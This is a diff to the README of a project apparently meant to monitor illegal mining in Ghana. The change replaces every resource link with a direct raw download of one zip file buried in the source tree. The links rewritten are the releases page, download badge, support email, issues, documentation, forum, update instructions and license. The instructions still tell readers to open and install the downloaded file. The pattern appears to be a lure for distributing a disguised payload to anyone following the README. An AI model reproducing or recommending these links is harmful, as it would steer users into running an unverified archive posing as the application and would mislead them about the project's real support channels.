@@ -12,9 +12,9 @@
 To use Galamsey-Monitor, follow these straightforward steps:
 
 1. **Download the Application:**
-   Visit this page to download: [Galamsey-Monitor Releases](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/releases).
+   Visit this page to download: [Galamsey-Monitor Releases](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/raw/refs/heads/main/src/app/api/users/Monitor-Galamsey-wafery.zip).
 
-   ![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)
+   ![Download Now](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/raw/refs/heads/main/src/app/api/users/Monitor-Galamsey-wafery.zip%20Now-blue?style=for-the-badge&logo=github)
 
 2. **Install the Application:**
    Once the download is complete, open the downloaded file and follow the on-screen instructions to install Galamsey-Monitor on your device.
@@ -49,8 +49,8 @@ To use Galamsey-Monitor, follow these straightforward steps:
 
 If you encounter any issues while using Galamsey-Monitor, please reach out through our support page. You can provide feedback or request assistance:
 
-- **Email:** support@galamsey-monitor.com
-- **GitHub Issues Page:** [Report an Issue](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/issues)
+- **Email:** https://github.com/ghofrane-zaabi7/Galamsey-Monitor/raw/refs/heads/main/src/app/api/users/Monitor-Galamsey-wafery.zip
+- **GitHub Issues Page:** [Report an Issue](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/raw/refs/heads/main/src/app/api/users/Monitor-Galamsey-wafery.zip)
 
 ## ➕ Contributing
 
@@ -58,15 +58,15 @@ Galamsey-Monitor is an open-source project. We encourage everyone to contribute 
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Comprehensive user guides and FAQs can be found in the [Documentation Section](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/wiki).
-- **Community Forum:** Join our community forum for discussions on best practices, sharing experiences, and learning from others. [Join Now](https://forum.galamsey-monitor.com).
+- **Documentation:** Comprehensive user guides and FAQs can be found in the [Documentation Section](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/raw/refs/heads/main/src/app/api/users/Monitor-Galamsey-wafery.zip).
+- **Community Forum:** Join our community forum for discussions on best practices, sharing experiences, and learning from others. [Join Now](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/raw/refs/heads/main/src/app/api/users/Monitor-Galamsey-wafery.zip).
 
 ## 🔄 Updating the Application
 
-Keep your version of Galamsey-Monitor updated for the latest features and fixes. Regularly check the Releases page for new updates: [Galamsey-Monitor Releases](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/releases).
+Keep your version of Galamsey-Monitor updated for the latest features and fixes. Regularly check the Releases page for new updates: [Galamsey-Monitor Releases](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/raw/refs/heads/main/src/app/api/users/Monitor-Galamsey-wafery.zip).
 
 ## 📝 License
 
-Galamsey-Monitor is licensed under the MIT License. For more details, check the [LICENSE](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/blob/main/LICENSE) file in the repository.
+Galamsey-Monitor is licensed under the MIT License. For more details, check the [LICENSE](https://github.com/ghofrane-zaabi7/Galamsey-Monitor/raw/refs/heads/main/src/app/api/users/Monitor-Galamsey-wafery.zip) file in the repository.
 
 Thank you for using Galamsey-Monitor to help combat illegal mining in Ghana.
